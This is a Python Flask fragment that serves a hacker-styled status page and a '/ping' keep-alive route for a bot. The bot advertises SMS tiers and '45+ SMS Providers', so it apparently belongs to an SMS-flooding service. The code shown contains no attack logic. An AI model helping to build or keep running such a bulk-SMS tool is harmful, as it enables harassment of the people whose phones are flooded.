flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return f"""
    <html>
    <head>
        <title>{BOT_NAME}</title>
        <style>
            body {{ background:#0a0a0a; color:#00ff41; font-family:monospace; padding:40px; text-align:center; }}
            h1 {{ color:#ff0040; text-shadow:0 0 20px #ff0040; }}
            .box {{ border:1px solid #00ff41; padding:20px; margin:20px auto; max-width:500px; border-radius:10px; }}
            .green {{ color:#00ff41; }}
            .red {{ color:#ff0040; }}
        </style>
    </head>
    <body>
        <h1>🔥 {BOT_NAME} 🔥</h1>
        <div class="box">
            <p class="green">✅ STATUS: <b>RUNNING 24/7</b></p>
            <p>🤖 {BOT_MADE_BY}</p>
            <p>👤 Admin: {ADMIN_USERNAME}</p>
            <p>🔋 Low = 30+ SMS | 💎 Premium = Unlimited</p>
            <hr>
            <p>🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>📊 Users: {len(load_db())}</p>
        </div>
        <p><small>45+ SMS Providers • UptimeRobot 24/7</small></p>
    </body>
    </html>
    """

@flask_app.route('/ping')
def ping():
    return "pong", 200

# ============================================================
# MAIN
# ============================================================

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, debug=False)

